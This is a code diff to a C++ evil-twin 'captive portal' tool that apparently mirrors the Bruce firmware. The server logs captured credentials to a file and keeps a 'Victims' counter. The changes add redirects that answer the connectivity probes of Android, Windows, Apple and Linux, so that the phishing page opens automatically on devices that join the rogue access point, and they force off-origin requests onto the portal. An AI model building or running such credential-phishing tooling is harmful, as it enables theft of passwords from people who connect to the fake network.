@@ -387,6 +387,12 @@ HttpRequest parse_http_request(const std::string& raw) {
         std::getline(h, value);
         if (strcasecmp(name.c_str(), "Content-Length") == 0) {
             content_length = static_cast<size_t>(strtoul(trim(value).c_str(), nullptr, 10));
+        } else if (strcasecmp(name.c_str(), "Host") == 0) {
+            // Keep only the host, dropping any ":port" (the captive check below
+            // compares it against the bare gateway IP).
+            std::string hv = trim(value);
+            const size_t colon = hv.find(':');
+            req.host = colon == std::string::npos ? hv : hv.substr(0, colon);
         }
     }
     if (body.size() > content_length) body.resize(content_length);
@@ -683,6 +689,49 @@ std::string arg_value(const HttpRequest& req, const std::string& key) {
     return "";
 }
 
+// A 302 pointing the client at the portal root. The OS connectivity probes
+// (and any off-origin request) get redirected here so the captive-portal UI
+// pops up, mirroring Bruce's setupRoutes()/onNotFound redirects.
+HttpResponse make_redirect(const std::string& gateway) {
+    HttpResponse r;
+    r.status = 302;
+    r.location = "http://" + gateway + "/";
+    return r;
+}
+
+// Apple's /hotspot-detect.html probe: Bruce answers 200 with a meta-refresh
+// (not a 302) so iOS/macOS open the captive assistant.
+std::string hotspot_meta(const std::string& gateway) {
+    return "<html><head><meta http-equiv=\"refresh\" content=\"0;url=http://" + gateway +
+           "\"></head><body></body></html>";
+}
+
+// Exact probe paths Bruce registers a 302 for (hotspot-detect.html handled
+// separately above).
+bool is_probe_redirect(const std::string& path) {
+    static const char* const kProbes[] = {
+        "/generate_204", "/gen_204", "/library/test/success.html", "/ncsi.txt",
+        "/connecttest.txt", "/redirect", "/success.txt", "/canonical.html", "/fwlink",
+        "/detectportal.firefox.com/success.txt", "/client.msftconnecttest.com/redirect"};
+    for (const char* p : kProbes) {
+        if (path == p) return true;
+    }
+    return false;
+}
+
+// Bruce's onNotFound substring match: any path mentioning a known connectivity
+// check also gets redirected.
+bool is_captive_substr(const std::string& path) {
+    static const char* const kSub[] = {
+        "detectportal", "connecttest", "success",   "generate",     "msftconnecttest",
+        "clients3.google.com", "ncsi",   "nmcheck",  "gnome",        "ubuntu",
+        "canonical",   "networkcheck",   "hotspot"};
+    for (const char* s : kSub) {
+        if (path.find(s) != std::string::npos) return true;
+    }
+    return false;
+}
+
 } // namespace
 
 HttpResponse portal_handle_request(const HttpRequest& req, PortalOptions& opts, PortalState& state,
@@ -726,14 +775,41 @@ HttpResponse portal_handle_request(const HttpRequest& req, PortalOptions& opts, 
         state.victims = 0; // Bruce restartWiFi(reset=true) resets the counter
         return make_html(ssid_post_page(opts.ap_name));
     }
+    // OS captive-portal probes are GET-only in Bruce's setupRoutes; a non-GET to
+    // one of these paths falls through to the substring/args handling below
+    // (Bruce would capture it via onNotFound).
+    if (req.method == "GET") {
+        if (is_probe_redirect(path)) {
+            return make_redirect(opts.gateway);
+        }
+        // Apple's probe wants a 200 with a meta-refresh, not a 302.
+        if (path == "/hotspot-detect.html") {
+            return make_html(hotspot_meta(opts.gateway));
+        }
+    }
+    // Bruce onNotFound substring match (connectivitycheck/ncsi/nmcheck/...); it
+    // precedes args/portal for any method.
+    if (is_captive_substr(req.path)) {
+        return make_redirect(opts.gateway);
+    }
+    // The portal root always serves the page (Bruce portalController), with or
+    // without args; only force an off-origin request onto the gateway first so
+    // the captive UI opens (a gateway-addressed request has no redirect loop).
     if (path == "/" || path.empty()) {
+        if (!req.host.empty() && req.host != opts.gateway) {
+            return make_redirect(opts.gateway);
+        }
         return make_html(opts.html_page);
     }
+    // onNotFound with args -> capture (portals POST to arbitrary paths).
     if (!req.args.empty()) {
-        // onNotFound with args -> capture ( portals POST to arbitrary paths).
         HttpRequest post = req;
         post.path = "/post";
         return portal_handle_request(post, opts, state, hooks);
+    }
+    // Off-origin request with no args -> force it onto the portal origin.
+    if (!req.host.empty() && req.host != opts.gateway) {
+        return make_redirect(opts.gateway);
     }
     return make_html(opts.html_page);
 }
@@ -1194,6 +1270,8 @@ int serve_portal(PortalOptions opts, const std::string& iface) {
     std::printf("AP: '%s' (channel %d on %s)\n", opts.ap_name.c_str(), opts.channel, iface.c_str());
     std::printf("-> http://%s/creds\n", opts.gateway.c_str());
     std::printf("-> http://%s/ssid\n", opts.gateway.c_str());
+    std::printf("Captive Portal: ACTIVE\n");
+    std::printf("Notifications: ENABLED\n");
     std::printf("Victims: 0\n");
     std::printf("captures -> %s\n", creds_path.c_str());
     std::printf("Back / Ctrl-C to stop.\n\n");
@@ -1235,9 +1313,15 @@ int serve_portal(PortalOptions opts, const std::string& iface) {
         const int before = state.victims;
         const HttpResponse resp = portal_handle_request(req, opts, state, hooks);
 
-        std::string out = "HTTP/1.1 " + std::to_string(resp.status) +
-                          " OK\r\nContent-Type: text/html\r\nConnection: close\r\nContent-Length: " +
-                          std::to_string(resp.body.size()) + "\r\n\r\n" + resp.body;
+        std::string out;
+        if (resp.status == 302) {
+            out = "HTTP/1.1 302 Found\r\nLocation: " + resp.location +
+                  "\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
+        } else {
+            out = "HTTP/1.1 " + std::to_string(resp.status) +
+                  " OK\r\nContent-Type: text/html\r\nConnection: close\r\nContent-Length: " +
+                  std::to_string(resp.body.size()) + "\r\n\r\n" + resp.body;
+        }
         ::send(conn, out.data(), out.size(), 0);
         ::close(conn);
 
